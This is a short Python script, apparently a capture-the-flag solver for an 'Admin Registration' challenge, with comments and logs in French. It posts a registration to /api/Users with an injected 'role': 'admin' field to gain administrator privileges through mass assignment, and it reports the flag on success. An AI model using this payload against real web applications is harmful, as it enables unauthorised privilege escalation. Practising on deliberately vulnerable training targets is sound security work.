import requests

class AdminRegistration:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}

    def register_admin_user(self, callback):
        endpoint = f"{self.base_url}/api/Users"
        payload = {
            "email": "admin@example.com",
            "password": "Admin123!",
            "username": "adminUser",
            "role": "admin"  # Ajout du champ "role" pour tenter d'obtenir des privilèges administratifs
        }

        callback(f"[REGISTER] Tentative d'inscription avec des privilèges administratifs...")
        response = self.session.post(endpoint, json=payload, headers=self.headers)

        if response.status_code == 201:  # Code HTTP 201 signifie "Créé"
            callback("[SUCCESS] Inscription réussie en tant qu'administrateur.")
            callback(f"Response: {response.json()}")
            return True
        else:
            callback(f"[FAIL] L'inscription a échoué. Statut: {response.status_code}")
            callback(f"Response: {response.text}")
            return False

    def run_exploit(self, callback):
        callback("[EXPLOIT] Démarrage de l'exploit pour le challenge 'Admin Registration'...")
        success = self.register_admin_user(callback)
        if success:
            callback("[EXPLOIT] Exploit terminé avec succès. Flag activé.")
        else:
            callback("[EXPLOIT] L'exploit a échoué.")
    
